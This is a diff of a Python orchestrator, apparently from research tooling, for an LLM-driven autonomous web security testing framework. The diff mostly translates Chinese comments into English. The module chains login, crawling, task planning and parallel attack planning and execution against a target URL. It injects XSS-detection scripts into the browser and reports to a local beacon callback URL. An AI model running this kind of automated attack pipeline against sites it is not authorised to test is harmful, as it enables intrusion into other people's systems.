@@ -1,6 +1,6 @@
 """
 High-Level Decision Agent
-自主化安全测试的顶层决策Agent
+Top-level decision agent for autonomous security testing
 """
 
 import json
@@ -22,25 +22,26 @@ from account.account_manager import AccountManager
 from plan_agent.task_planning_agent import TaskPlanningAgent
 from plan_agent.attack_planning_agent import AttackPlanningAgent
 from attack_agent.attack_executor import AttackExecutor
-# 🆕 不再导入具体的 agent 类（改为在 AttackExecutor 中按需创建）
+from utils.token_tracker import tracker
+# 🆕 No longer import specific agent classes (now created on-demand in AttackExecutor)
 
-# 猴子补丁，修改原始get方法，避免老超时报错导致程序终止
-# 保存原始 get 方法
+# Monkey patch to modify the original get method, avoiding old timeout errors that terminate the program
+# Save the original get method
 _original_get = WebDriver.get
 
-# 定义静默版 get 方法
+# Define silent version of get method
 def silent_get(self, url, modify=False):
     try:
         _original_get(self, url)
-        # 部分网页需要刷新
+        # Some pages need a refresh
         # self.refresh()
         time.sleep(2)
         return True
-    except Exception as e:  # 捕获异常对象 e
-        print(f"静默失败{url}，异常信息: {e}")  # 打印异常信息
+    except Exception as e:  # Catch exception object e
+        print(f"Silent failure for {url}, exception: {e}")  # Print exception info
         return False
 
-# 替换默认的 get 方法
+# Replace the default get method
 WebDriver.get = silent_get
 
 def send(driver, cmd, params={}):
@@ -53,15 +54,15 @@ WebDriver.add_script = add_script
 
 class HighLevelDecisionAgent:
     """
-    顶层决策Agent
+    Top-level Decision Agent
 
-    工作流程：
-    1. Login - 执行登录任务
-    2. Deep Crawl - 深度爬取（50页）
-    3. Task Planning - 任务规划
-    4. Attack Planning - 攻击规划
-    5. Attack Execution - 攻击执行
-    6. Report Generation - 生成报告
+    Workflow:
+    1. Login - Execute login task
+    2. Deep Crawl - Deep crawling (50 pages)
+    3. Task Planning - Task planning
+    4. Attack Planning - Attack planning
+    5. Attack Execution - Attack execution
+    6. Report Generation - Generate report
     """
 
     def __init__(self,
@@ -72,26 +73,26 @@ class HighLevelDecisionAgent:
                  output_dir: str = "output",
                  chrome_options = None,
                  config: Optional[Dict] = None,
-                 target_domain: Optional[str] = None):  # 🆕 新增参数
+                 target_domain: Optional[str] = None):  # 🆕 New parameter
         """
-        初始化顶层决策Agent
+        Initialize the top-level decision agent.
 
         Args:
             client: OpenAI client
-            initial_url: 目标URL（登录页面或应用首页）
-            login_task: 登录任务描述（可选）
-            crawl_start_url: 爬取起始URL（可选，登录后导航到此URL开始爬取）
-            output_dir: 输出目录
-            chrome_options: Chrome选项（可选）
-            config: 配置字典（可选），包含以下可配置项：
-                - crawl_max_pages: 爬取最大页面数（默认50）
-                - crawl_time_limit: 爬取时间限制秒数（默认None，无限制）
-                - crawl_max_llm_workers: 爬取时LLM任务最大并发数（默认20）
-                - task_planning_max_iterations: 任务规划最大迭代次数（默认200，之前是100）
-                - task_planning_max_workers: 任务执行并行worker数（默认5）
-                - attack_planning_max_iterations: 攻击规划最大迭代次数（默认100）
-                - attack_planning_mode: 攻击规划模式："llm"（LLM智能规划，默认）或 "exhaustive"（穷举全测，用于消融实验）
-                - attack_execution_max_workers: 攻击执行并行worker数（默认10）
+            initial_url: Target URL (login page or application homepage)
+            login_task: Login task description (optional)
+            crawl_start_url: Crawl start URL (optional, navigates to this URL after login to begin crawling)
+            output_dir: Output directory
+            chrome_options: Chrome options (optional)
+            config: Configuration dictionary (optional), with the following configurable items:
+                - crawl_max_pages: Maximum number of pages to crawl (default 50)
+                - crawl_time_limit: Crawl time limit in seconds (default None, unlimited)
+                - crawl_max_llm_workers: Maximum concurrent LLM workers during crawling (default 20)
+                - task_planning_max_iterations: Maximum task planning iterations (default 200, previously 100)
+                - task_planning_max_workers: Number of parallel workers for task execution (default 5)
+                - attack_planning_max_iterations: Maximum attack planning iterations (default 100)
+                - attack_planning_mode: Attack planning mode: "llm" (LLM intelligent planning, default) or "exhaustive" (exhaustive testing, for ablation experiments)
+                - attack_execution_max_workers: Number of parallel workers for attack execution (default 10)
         """
         self.client = client
         self.initial_url = initial_url
@@ -99,39 +100,39 @@ class HighLevelDecisionAgent:
         self.crawl_start_url = crawl_start_url
         self.output_dir = Path(output_dir)
         self.chrome_options = chrome_options
-        # 🆕 确定目标域名（优先使用传入的，否则从initial_url提取）
+        # 🆕 Determine target domain (prefer the passed-in value, otherwise extract from initial_url)
         if target_domain:
             self.target_domain = target_domain
-            print(f"[DecisionAgent] 使用传入的目标域名: {self.target_domain}")
+            print(f"[DecisionAgent] Using provided target domain: {self.target_domain}")
         else:
             from urllib.parse import urlparse
             parsed = urlparse(initial_url)
-            self.target_domain = parsed.hostname  # 提取域名（不含端口）
-            print(f"[DecisionAgent] 从initial_url自动提取目标域名: {self.target_domain}")
+            self.target_domain = parsed.hostname  # Extract domain (without port)
+            print(f"[DecisionAgent] Auto-extracted target domain from initial_url: {self.target_domain}")
 
         self.config = {
-            # Phase 2: 爬取
+            # Phase 2: Crawling
             "crawl_max_pages": 100,
             "crawl_time_limit": None,
             "crawl_max_llm_workers": 20,
 
-            # Phase 3: 任务规划
+            # Phase 3: Task Planning
             "task_planning_max_iterations": 100,  #
             "task_planning_max_workers": 10,
 
-            # Phase 4: 攻击规划
+            # Phase 4: Attack Planning
             "attack_planning_max_iterations": 100,
-            "attack_planning_mode": "llm",  # 🆕 攻击规划模式："llm"（智能规划）或 "exhaustive"（穷举全测）
+            "attack_planning_mode": "llm",  # 🆕 Attack planning mode: "llm" (intelligent planning) or "exhaustive" (exhaustive testing)
 
-            # Phase 5: 攻击执行
+            # Phase 5: Attack Execution
             "attack_execution_max_workers": 10,
         }
 
-        # 覆盖用户自定义配置
+        # Override with user-provided configuration
         if config:
             self.config.update(config)
 
-        # 创建输出目录结构
+        # Create output directory structure
         self.dirs = {
             "crawl": self.output_dir / "crawl",
             "task_planning": self.output_dir / "task_planning",
@@ -142,47 +143,50 @@ class HighLevelDecisionAgent:
         for dir_path in self.dirs.values():
             dir_path.mkdir(parents=True, exist_ok=True)
 
-        # 日志文件
+        # Log file
         self.log_path = self.output_dir / "high_level_agent.log"
 
-        # 初始化状态
+        # Flag whether final report has been generated (avoid duplicate saves in _cleanup)
+        self._final_report_saved = False
+
+        # Initialize state
         self.state = {
             "current_phase": "init",
             "start_time": datetime.now().isoformat(),
             "initial_url": initial_url,
             "login_task": login_task,
 
-            # 各阶段完成标记
+            # Completion flags for each phase
             "login_complete": False,
             "crawl_complete": False,
             "task_planning_complete": False,
             "attack_planning_complete": False,
             "attack_execution_complete": False,
 
-            # 统计信息
+            # Statistics
             "pages_count": 0,
             "tasks_executed": 0,
             "attacks_planned": 0,
             "vulnerabilities_found": 0
         }
 
-        # 共享组件
+        # Shared components
         self.driver = None
         self.account_manager = None
 
-        # 各阶段组件
+        # Phase components
         self.crawler = None
         self.task_planner = None
         self.attack_planner = None
         self.executor = None
-        # 🆕 保存worker drivers（从Task Planning传递到Attack）
+        # 🆕 Save worker drivers (passed from Task Planning to Attack phase)
         self.worker_drivers = []
 
-        # 时间统计
+        # Timing statistics
         self.phase_times = {}
 
     def _log(self, *args):
-        """记录日志"""
+        """Log a message"""
         msg = " ".join(str(a) for a in args)
         print(msg)
         try:
@@ -192,7 +196,7 @@ class HighLevelDecisionAgent:
             pass
 
     def _save_state(self):
-        """保存当前状态"""
+        """Save current state"""
         state_path = self.output_dir / "agent_state.json"
         try:
             with open(state_path, 'w', encoding='utf-8') as f:
@@ -201,64 +205,64 @@ class HighLevelDecisionAgent:
             self._log(f"Warning: Failed to save state: {e}")
 
     def run(self) -> Dict[str, Any]:
-        """执行完整的自动化测试流程"""
+        """Execute the complete automated testing workflow"""
         try:
             self._log("\n" + "="*70)
-            self._log("🚀 启动自主化安全测试框架")
+            self._log("🚀 Starting Autonomous Security Testing Framework")
             self._log("="*70)
-            self._log(f"目标URL: {self.initial_url}")
+            self._log(f"Target URL: {self.initial_url}")
             if self.login_task:
-                self._log(f"登录任务: {self.login_task}")
+                self._log(f"Login task: {self.login_task}")
             else:
-                self._log(f"登录任务: 无（直接爬取）")
+                self._log(f"Login task: None (direct crawling)")
             self._log("="*70 + "\n")
 
-            # 初始化driver
+            # Initialize driver
             self._init_driver()
 
-            # ✅ 提前初始化crawler（Phase 1需要使用crawler.run_a_task执行登录任务）
+            # ✅ Initialize crawler early (Phase 1 needs crawler.run_a_task to execute login task)
             self.crawler = Crawler(
                 driver=self.driver,
                 client=self.client,
                 initial_url=self.initial_url,
-                target_domain=self.target_domain, # 🆕 传入参数
+                target_domain=self.target_domain, # 🆕 Pass parameter
                 store_root=str(self.dirs["crawl"])
             )
 
-            # 2. 测试 xss() 函数
-            # 发送一个特征字符串 "TEST_INIT_BEACON"
-            # self._log(f"[DEBUG] 执行浏览器端 JS: xss()")
+            # 2. Test xss() function
+            # Send a signature string "TEST_INIT_BEACON"
+            # self._log(f"[DEBUG] Executing browser-side JS: xss()")
             # self.driver.get(self.initial_url)
-            # # 这里的 execute_script 是同步的，如果 xss 函数有问题会直接抛出异常
+            # # execute_script here is synchronous; if xss function has issues it will throw directly
             # self.driver.execute_script("xss(4244564)")
-            # self._log(f"[DEBUG] 执行浏览器端 JS 完成")
+            # self._log(f"[DEBUG] Browser-side JS execution complete")
 
-            # 阶段1: 执行登录（如果提供了login_task）
+            # Phase 1: Execute login (if login_task is provided)
             if self.login_task:
                 self._phase_1_login()
             else:
-                self._log("\n[阶段1] 跳过登录，直接进入爬取阶段")
+                self._log("\n[Phase 1] Skipping login, proceeding directly to crawl phase")
                 self.state["login_complete"] = False
 
-            # ✅ DEBUG: 重放命令（不需要时注释掉下面这行）
+            # ✅ DEBUG: Replay commands (comment out the line below when not needed)
             # self._debug_replay_commands()
 
-            # ✅ TEST: 测试独立driver创建（验证通过后注释掉下面这行）
+            # ✅ TEST: Test independent driver creation (comment out the line below after verification)
             # self._test_create_cloned_drivers()
 
-            # 阶段2: 深度爬取（复用已创建的crawler）
+            # Phase 2: Deep crawl (reuse the already created crawler)
             self._phase_2_crawl()
 
-            # 阶段3: 任务规划
+            # Phase 3: Task planning
             self._phase_3_task_planning()
 
-            # 🆕 阶段4+5: 流水线并行攻击（替代原来的Phase 4和Phase 5）
+            # 🆕 Phase 4+5: Pipeline parallel attack (replaces the original Phase 4 and Phase 5)
             self._phase_4_5_pipeline_attack()
 
-            # 生成最终报告
+            # Generate final report
             self._generate_final_report()
 
-            # 返回结果
+            # Return results
             return {
                 "crawling": {
                     "total_pages": self.state["pages_count"]
@@ -274,7 +278,7 @@ class HighLevelDecisionAgent:
             }
 
         except Exception as e:
-            self._log(f"\n❌ 测试流程异常: {e}")
+            self._log(f"\n❌ Testing workflow exception: {e}")
             import traceback
             self._log(traceback.format_exc())
             raise
@@ -282,8 +286,8 @@ class HighLevelDecisionAgent:
             self._cleanup()
 
     def _init_driver(self):
-        """初始化浏览器driver"""
-        self._log("\n[初始化] 启动浏览器...")
+        """Initialize browser driver"""
+        self._log("\n[Init] Starting browser...")
 
         if not self.chrome_options:
             chrome_options = webdriver.ChromeOptions()
@@ -300,7 +304,7 @@ class HighLevelDecisionAgent:
         self.driver.set_script_timeout(60)
         self.driver.set_window_size(1920, 1080)
 
-        # 拦截外部请求
+        # Intercept external requests
         def interceptor(request):
             request_url = request.url
             # if '127.0.0.1' not in request_url and 'localhost' not in request_url:
@@ -309,30 +313,30 @@ class HighLevelDecisionAgent:
 
         self.driver.request_interceptor = interceptor
 
-        # ✅ 注入XSS检测脚本（关键修复）
+        # ✅ Inject XSS detection script (critical fix)
         self.driver.add_script( open("js/xss_xhr.js", "r").read() )
 
-        # ✅ 注入事件监听器捕获脚本（新增）
-        # 注意：lib.js 必须先于 addeventlistener_wrapper.js 加载
+        # ✅ Inject event listener capture script (new)
+        # Note: lib.js must be loaded before addeventlistener_wrapper.js
         self.driver.add_script( open("js/md5.js", "r").read() )
         self.driver.add_script( open("js/lib.js", "r").read() )
         self.driver.add_script( open("js/addeventlistener_wrapper.js", "r").read() )
-        self._log("[初始化] 事件监听器捕获脚本已注入")
+        self._log("[Init] Event listener capture script injected")
 
-        self._log("[初始化] 浏览器启动成功")
+        self._log("[Init] Browser started successfully")
 
     def _phase_1_login(self):
-        """阶段1: 执行登录任务"""
+        """Phase 1: Execute login task"""
         phase_start = time.time()
 
         self._log("\n" + "="*70)
-        self._log("阶段1: 执行登录")
+        self._log("Phase 1: Execute Login")
         self._log("="*70)
-        self._log(f"登录页面: {self.initial_url}")
-        self._log(f"任务描述: {self.login_task}")
+        self._log(f"Login page: {self.initial_url}")
+        self._log(f"Task description: {self.login_task}")
 
         try:
-            # ✅ 修复：初始化 AccountManager（使用正确的参数）
+            # ✅ Fix: Initialize AccountManager (using correct parameters)
             if not self.account_manager:
                 self.account_manager = AccountManager(
                     store_path=str(self.output_dir / "accounts.json"),
@@ -340,27 +344,28 @@ class HighLevelDecisionAgent:
                     default_login_url=self.initial_url
                 )
 
-            # 导航到登录页面
+            # Navigate to login page
             self.driver.get(self.initial_url)
             time.sleep(2)
 
-            # 创建登录任务
+            # Create login task
             task = Task(
                 task_id=1,
                 description=self.login_task,
                 initial_url=self.initial_url
             )
 
-            # ✅ 保存 task 对象（用于Phase 5恢复登录）
+            # ✅ Save task object (used for Phase 5 login recovery)
             self.login_task_object = task
 
-            # ✅ 修复：执行登录（使用crawler.run_a_task）
-            self._log("\n[执行登录任务]")
+            # ✅ Fix: Execute login (using crawler.run_a_task)
+            self._log("\n[Execute Login Task]")
+            tracker.set_category("login_bridge")
             self.crawler.run_a_task(task, logging_in=True)
 
-            # ✅ 提取凭证并创建 default_account
-            self._log("\n[创建 default_account]")
-            time.sleep(1)  # 等待页面稳定
+            # ✅ Extract credentials and create default_account
+            self._log("\n[Create default_account]")
+            time.sleep(1)  # Wait for page to stabilize
             credentials = self.account_manager._extract_credentials(self.driver)
             self.account_manager.create_account_from_credentials(
                 account_id="default_account",
@@ -368,11 +373,11 @@ class HighLevelDecisionAgent:
                 role="main_user",
                 login_url=self.initial_url
             )
-            # 保存 driver 引用
+            # Save driver reference
             self.account_manager.set_driver("default_account", self.driver)
-            self._log("[default_account] 已创建并保存主 driver 的凭证")
+            self._log("[default_account] Created and saved main driver credentials")
 
-            # 更新状态
+            # Update state
             self.state["login_complete"] = True
             self.state["current_phase"] = "login_complete"
             self._save_state()
@@ -380,69 +385,70 @@ class HighLevelDecisionAgent:
             phase_duration = time.time() - phase_start
             self.phase_times["phase_1_login"] = phase_duration
 
-            self._log(f"\n[阶段1完成] 登录成功")
-            self._log(f"⏱️  用时: {phase_duration:.1f}秒")
+            self._log(f"\n[Phase 1 Complete] Login successful")
+            self._log(f"⏱️  Duration: {phase_duration:.1f}s")
 
         except Exception as e:
-            self._log(f"\n❌ 登录失败: {e}")
+            self._log(f"\n❌ Login failed: {e}")
             import traceback
             self._log(traceback.format_exc())
             raise
 
     def _phase_2_crawl(self):
-        """阶段2: 深度爬取（50页）"""
+        """Phase 2: Deep crawl (50 pages)"""
         phase_start = time.time()
 
         self._log("\n" + "="*70)
-        self._log("阶段2: 深度爬取（Deep Crawl）")
+        self._log("Phase 2: Deep Crawl")
         self._log("="*70)
-        self._log(f"参数: max_pages={self.config['crawl_max_pages']}, time_limit={self.config['crawl_time_limit']}")
+        self._log(f"Parameters: max_pages={self.config['crawl_max_pages']}, time_limit={self.config['crawl_time_limit']}")
 
-        # 确定起始URL
+        # Determine start URL
         if self.crawl_start_url:
-            # 如果指定了爬取起始URL，使用它
+            # If a crawl start URL is specified, use it
             start_url = self.crawl_start_url
-            self._log(f"模式: 指定起始URL爬取")
-            # 导航到指定URL
+            self._log(f"Mode: Specified start URL crawl")
+            # Navigate to specified URL
             self.driver.get(self.crawl_start_url)
             time.sleep(2)
         elif self.state.get("login_complete", False):
-            # 如果已登录且未指定起始URL，从当前页面开始爬取
+            # If logged in and no start URL specified, crawl from current page
             start_url = self.driver.current_url
-            self._log(f"模式: 已认证爬取（从登录后页面开始）")
+            self._log(f"Mode: Authenticated crawl (starting from post-login page)")
         else:
-            # 如果未登录，从初始URL开始爬取
+            # If not logged in, crawl from initial URL
             start_url = self.initial_url
-            self._log(f"模式: 无认证爬取（从目标URL开始）")
-            # 导航到初始URL
+            self._log(f"Mode: Unauthenticated crawl (starting from target URL)")
+            # Navigate to initial URL
             self.driver.get(self.initial_url)
             time.sleep(2)
 
-        self._log(f"起始URL: {start_url}")
+        self._log(f"Start URL: {start_url}")
 
-        # ✅ 修复：crawler已在run()中创建，这里只需要更新initial_url
-        # 如果起始URL与创建时不同，更新crawler的initial_url
+        # ✅ Fix: crawler was already created in run(), just need to update initial_url here
+        # If start URL differs from creation time, update crawler's initial_url
         if start_url != self.crawler.initial_url:
-            self._log(f"[更新crawler起始URL] {self.crawler.initial_url} -> {start_url}")
+            self._log(f"[Update crawler start URL] {self.crawler.initial_url} -> {start_url}")
             self.crawler.initial_url = start_url
 
-        # 执行深度爬取
+        # Execute deep crawl
+        tracker.set_category("crawl_bridge")
         self.crawler.crawl(
             max_pages=self.config["crawl_max_pages"],
             time_limit=self.config["crawl_time_limit"],
             max_llm_workers=self.config["crawl_max_llm_workers"]
         )
 
-        # 导出结果
+        # Export results
         self.crawler.export_task_plan_graph(
             output_path=str(self.dirs["crawl"] / "task_plan_graph.json")
         )
 
-        # ✅ 如果没有登录（无认证场景），创建 default_account
+        # ✅ If not logged in (unauthenticated scenario), create default_account
         if not self.state.get("login_complete", False):
-            self._log("\n[创建 default_account（无认证场景）]")
+            self._log("\n[Create default_account (unauthenticated scenario)]")
 
-            # 初始化 AccountManager（如果还没有）
+            # Initialize AccountManager (if not already done)
             if not self.account_manager:
                 self.account_manager = AccountManager(
                     store_path=str(self.output_dir / "accounts.json"),
@@ -450,7 +456,7 @@ class HighLevelDecisionAgent:
                     default_login_url=self.initial_url
                 )
 
-            # 提取当前 driver 的状态（可能是空凭证）
+            # Extract current driver state (may be empty credentials)
             credentials = self.account_manager._extract_credentials(self.driver)
             self.account_manager.create_account_from_credentials(
                 account_id="default_account",
@@ -458,11 +464,11 @@ class HighLevelDecisionAgent:
                 role="unauthenticated",
                 login_url=self.initial_url
             )
-            # 保存 driver 引用
+            # Save driver reference
             self.account_manager.set_driver("default_account", self.driver)
-            self._log("[default_account] 已创建（无认证模式）")
+            self._log("[default_account] Created (unauthenticated mode)")
 
-        # 更新状态
+        # Update state
         self.state["crawl_complete"] = True
         self.state["pages_count"] = len(self.crawler.store.pages)
         self.state["current_phase"] = "crawl_complete"
@@ -471,26 +477,26 @@ class HighLevelDecisionAgent:
         phase_duration = time.time() - phase_start
         self.phase_times["phase_2_crawl"] = phase_duration
 
-        self._log(f"\n[阶段2完成] 发现 {self.state['pages_count']} 个页面")
-        self._log(f"⏱️  用时: {phase_duration:.1f}秒")
+        self._log(f"\n[Phase 2 Complete] Discovered {self.state['pages_count']} pages")
+        self._log(f"⏱️  Duration: {phase_duration:.1f}s")
 
     def _phase_3_task_planning(self, use_parallel: bool = True):
         """
-        阶段3: 任务规划与执行
+        Phase 3: Task planning and execution
 
         Args:
-            use_parallel: 是否使用并行模式（默认True）
-                - True: 使用10个独立driver并行执行任务
-                - False: 使用串行模式（向后兼容）
+            use_parallel: Whether to use parallel mode (default True)
+                - True: Use 10 independent drivers for parallel task execution
+                - False: Use serial mode (backward compatible)
         """
         phase_start = time.time()
 
         self._log("\n" + "="*70)
-        self._log("阶段3: 任务规划与执行（Task Planning & Execution）")
-        self._log(f"模式: {'并行' if use_parallel else '串行'}")
+        self._log("Phase 3: Task Planning & Execution")
+        self._log(f"Mode: {'Parallel' if use_parallel else 'Serial'}")
         self._log("="*70)
 
-        # 初始化AccountManager（如果还没有）
+        # Initialize AccountManager (if not already done)
         if not self.account_manager:
             self.account_manager = AccountManager(
                 store_path=str(self.output_dir / "accounts.json"),
@@ -498,17 +504,17 @@ class HighLevelDecisionAgent:
                 default_login_url=self.initial_url
             )
 
-        # 创建TaskPlanningAgent
+        # Create TaskPlanningAgent
         self.task_planner = TaskPlanningAgent(
             client=self.client,
             crawler=self.crawler,
             account_manager=self.account_manager
         )
 
-        # 根据模式选择执行方式
+        # Choose execution method based on mode
         if use_parallel:
-            # ===== 并行模式 =====
-            self._log(f"\n[并行模式] 使用{self.config['task_planning_max_workers']}个独立driver并行执行任务")
+            # ===== Parallel mode =====
+            self._log(f"\n[Parallel Mode] Using {self.config['task_planning_max_workers']} independent drivers for parallel task execution")
 
             try:
                 from parallel.parallel_task_scheduler import ParallelTaskScheduler
@@ -521,36 +527,40 @@ class HighLevelDecisionAgent:
                     max_workers=self.config["task_planning_max_workers"]
                 )
 
+                # task_exec_bridge is the default category for Bridge calls in this phase;
+                # TaskPlanningAgent._call_llm internally uses tracker.phase("task_planning") to temporarily switch
+                tracker.set_category("task_exec_bridge")
                 result = scheduler.run(max_iterations=self.config["task_planning_max_iterations"], target_domain=self.target_domain)
 
-                # 统计结果
-                total_tasks = result.get("total_pages", 0)  # 并行模式返回执行的页面数
+                # Count results
+                total_tasks = result.get("total_pages", 0)  # Parallel mode returns the number of pages executed
 
-                # 🆕 保存worker drivers（不销毁，传递给Attack阶段）
+                # 🆕 Save worker drivers (don't destroy, pass to Attack phase)
                 self.worker_drivers = scheduler.get_worker_drivers()
                 self._log(f"\n[Worker Drivers] Saved {len(self.worker_drivers)} driver(s) for attack phase")
 
             except Exception as e:
-                self._log(f"\n[并行模式] ✗ 执行失败，回退到串行模式: {e}")
+                self._log(f"\n[Parallel Mode] ✗ Execution failed, falling back to serial mode: {e}")
                 import traceback
                 traceback.print_exc()
 
-                # 回退到串行模式
+                # Fall back to serial mode
                 result = self.task_planner.plan_and_execute(max_iterations=self.config["task_planning_max_iterations"])
                 total_tasks = result['total_tasks']
 
         else:
-            # ===== 串行模式（原逻辑） =====
-            self._log("\n[串行模式] 使用主driver串行执行任务")
+            # ===== Serial mode (original logic) =====
+            self._log("\n[Serial Mode] Using main driver for serial task execution")
+            tracker.set_category("task_exec_bridge")
             result = self.task_planner.plan_and_execute(max_iterations=self.config["task_planning_max_iterations"])
             total_tasks = result['total_tasks']
 
-        # 保存结果
+        # Save results
         self.crawler.export_execution_graph_with_requests(
             output_path=str(self.dirs["task_planning"] / "execution_graph_with_requests.json")
         )
 
-        # 更新状态
+        # Update state
         self.state["task_planning_complete"] = True
         self.state["tasks_executed"] = total_tasks
         self.state["current_phase"] = "task_planning_complete"
@@ -559,61 +569,61 @@ class HighLevelDecisionAgent:
         phase_duration = time.time() - phase_start
         self.phase_times["phase_3_task_planning"] = phase_duration
 
-        self._log(f"\n[阶段3完成] 执行任务/页面数: {total_tasks}")
-        self._log(f"⏱️  用时: {phase_duration:.1f}秒")
+        self._log(f"\n[Phase 3 Complete] Tasks/pages executed: {total_tasks}")
+        self._log(f"⏱️  Duration: {phase_duration:.1f}s")
 
     def _phase_4_5_pipeline_attack(self):
         """
-        🆕 阶段4+5: 流水线并行攻击（Attack Planning + Execution Pipeline）
+        🆕 Phase 4+5: Pipeline parallel attack (Attack Planning + Execution Pipeline)
 
-        改进：
-        - Phase 4和Phase 5同时运行
-        - Phase 4持续生成任务 → 放入队列
-        - Phase 5从队列取任务 → 并行执行（10 workers）
-        - 预期：Phase 4 (3分钟) 与 Phase 5 (3分钟) 重叠 → 总计约3分钟
+        Improvements:
+        - Phase 4 and Phase 5 run simultaneously
+        - Phase 4 continuously generates tasks -> puts them into a queue
+        - Phase 5 consumes tasks from the queue -> executes in parallel (10 workers)
+        - Expected: Phase 4 (3 min) overlaps with Phase 5 (3 min) -> total ~3 min
         """
         phase_start = time.time()
 
         self._log("\n" + "="*70)
-        self._log("阶段4+5: 流水线并行攻击（Attack Planning + Execution Pipeline）")
+        self._log("Phase 4+5: Pipeline Parallel Attack (Attack Planning + Execution Pipeline)")
         self._log("="*70)
-        self._log("模式: Phase 4 (Planning) 和 Phase 5 (Execution) 并行运行")
-        self._log("  - Planning线程: 持续生成任务并放入队列")
-        self._log("  - Execution线程池: 10个worker并发执行任务")
+        self._log("Mode: Phase 4 (Planning) and Phase 5 (Execution) run in parallel")
+        self._log("  - Planning thread: Continuously generates tasks and puts them into a queue")
+        self._log("  - Execution thread pool: 10 workers concurrently execute tasks")
         self._log("="*70 + "\n")
 
-        # 创建任务队列
+        # Create task queue
         import queue
         import threading
 
-        task_queue = queue.Queue(maxsize=100)  # 限制队列大小，避免内存溢出
+        task_queue = queue.Queue(maxsize=100)  # Limit queue size to avoid memory overflow
 
-        # ⚠️ 已禁用：定期保活线程（因为每个任务开始时已经有保活操作）
-        # 🆕 启动Session保活线程（保持主driver的session活跃）
+        # ⚠️ Disabled: periodic keep-alive thread (because each task already has a keep-alive operation at start)
+        # 🆕 Start Session keep-alive thread (keep main driver's session active)
         # from utils.session_keepalive import SessionKeepAliveThread
 
         # keepalive_thread = SessionKeepAliveThread(
         #     driver=self.driver,
-        #     initial_url=self.crawler.initial_url,  # 🆕 固定访问登录后的初始页面
+        #     initial_url=self.crawler.initial_url,  # 🆕 Fixed: visit the post-login initial page
         #     screenshot_dir=str(self.dirs["attack_execution"] / "session_keepalive"),
-        #     interval=60  # 每60秒访问一次随机页面
+        #     interval=60  # Visit a random page every 60 seconds
         # )
         # keepalive_thread.start()
-        # self._log("[KeepAlive] Session保活线程已启动（每60秒访问初始页面并截图）\n")
+        # self._log("[KeepAlive] Session keep-alive thread started (visits initial page and takes screenshot every 60s)\n")
 
-        # 创建AttackPlanningAgent
+        # Create AttackPlanningAgent
         self.attack_planner = AttackPlanningAgent(
             client=self.client,
             crawler=self.crawler,
             account_manager=self.account_manager,
             ctf_description=None,
             default_account="default_account",
-            planning_mode=self.config["attack_planning_mode"]  # 🆕 传入规划模式
+            planning_mode=self.config["attack_planning_mode"]  # 🆕 Pass planning mode
         )
 
-        # ✅ 启动Phase 4规划线程（生产者）
+        # ✅ Start Phase 4 planning thread (producer)
         def planning_worker():
-            """规划线程：持续生成任务并放入队列"""
+            """Planning thread: continuously generates tasks and puts them into the queue"""
             try:
                 self._log("[Phase 4 Thread] Starting attack planning...")
                 result = self.attack_planner.plan_and_stream(task_queue, max_iterations=self.config["attack_planning_max_iterations"])
@@ -623,7 +633,7 @@ class HighLevelDecisionAgent:
                 self._log(f"[Phase 4 Thread] Error: {e}")
                 import traceback
                 self._log(traceback.format_exc())
-                # 发送结束信号（即使失败也要通知executor）
+                # Send termination signal (notify executor even on failure)
                 task_queue.put(None)
                 return None
 
@@ -631,9 +641,9 @@ class HighLevelDecisionAgent:
         planning_thread.start()
         self._log("[Phase 4 Thread] Planning thread started\n")
 
-        # ✅ Phase 5在主线程执行（消费者）
-        # 🆕 不再预创建 agent 实例（改为在 AttackExecutor 中按需创建）
-        # 创建AttackExecutor
+        # ✅ Phase 5 executes in main thread (consumer)
+        # 🆕 No longer pre-create agent instances (now created on-demand in AttackExecutor)
+        # Create AttackExecutor
         from attack_agent.attack_executor import AttackExecutor
 
         self.executor = AttackExecutor(
@@ -641,44 +651,53 @@ class HighLevelDecisionAgent:
             crawler=self.crawler,
             client=self.client,
             driver=self.driver,
-            beacon_base="http://172.17.0.1:9091/",  # 🆕 统一的 beacon URL
+            beacon_base="http://172.17.0.1:9091/",  # 🆕 Unified beacon URL
             log_dir=str(self.dirs["attack_execution"]),
             edges_file=str(self.dirs["crawl"] / "edges.jsonl"),
-            worker_drivers=self.worker_drivers,  # 🆕 传递worker drivers
-            chrome_options=self.chrome_options,  # 🆕 传递chrome options（用于创建driver）
-            initial_url=self.crawler.initial_url,  # 🔧 修复：传递登录后的页面URL（用于登录检查）
-            login_task=getattr(self, 'login_task_object', None),  # ✅ 修复：传递 Task 对象而不是字符串
-            target_domain=self.target_domain  # ✅ 补上这个关键参数！
+            worker_drivers=self.worker_drivers,  # 🆕 Pass worker drivers
+            chrome_options=self.chrome_options,  # 🆕 Pass chrome options (for creating drivers)
+            initial_url=self.crawler.initial_url,  # 🔧 Fix: Pass the post-login page URL (for login check)
+            login_task=getattr(self, 'login_task_object', None),  # ✅ Fix: Pass Task object instead of string
+            target_domain=self.target_domain  # ✅ Add this critical parameter!
         )
 
-        # ✅ 执行任务（从队列消费）
+        # ✅ Execute tasks (consume from queue)
         self._log("[Phase 5 Main Thread] Starting attack execution from queue...\n")
-        execution_results = self.executor.execute_tasks_from_queue(
-            task_queue,
-            max_workers=self.config["attack_execution_max_workers"]
-        )
+        try:
+            execution_results = self.executor.execute_tasks_from_queue(
+                task_queue,
+                max_workers=self.config["attack_execution_max_workers"]
+            )
+        except KeyboardInterrupt:
+            self._log("\n⚠️  Phase 4+5 interrupted by user (Ctrl+C)")
+            execution_results = getattr(self.executor, 'results', [])
+        finally:
+            # Regardless of normal completion or Ctrl+C, immediately record attack phase time
+            attack_duration = getattr(self.executor, '_phase1_duration', time.time() - phase_start)
+            self.phase_times["phase_4_5_attack"] = attack_duration
+            self._log(f"\n⏱️  Attack planning+execution duration: {attack_duration:.1f}s")
 
-        # ✅ 等待规划线程完成
+        # ✅ Wait for planning thread to complete
         self._log("\n[Main Thread] Waiting for planning thread to finish...")
-        planning_thread.join(timeout=300)  # 最多等5分钟
+        planning_thread.join(timeout=300)  # Wait up to 5 minutes
         if planning_thread.is_alive():
             self._log("[Main Thread] Warning: Planning thread still running after 5 minutes")
         else:
             self._log("[Main Thread] Planning thread finished")
 
-        # ⚠️ 已禁用：停止定期保活线程
-        # 🆕 停止Session保活线程
+        # ⚠️ Disabled: stop periodic keep-alive thread
+        # 🆕 Stop Session keep-alive thread
         # self._log("\n[KeepAlive] Stopping session keep-alive thread...")
         # keepalive_thread.stop()
-        # self._log("[KeepAlive] Session保活线程已停止\n")
+        # self._log("[KeepAlive] Session keep-alive thread stopped\n")
 
-        # 统计漏洞
+        # Count vulnerabilities
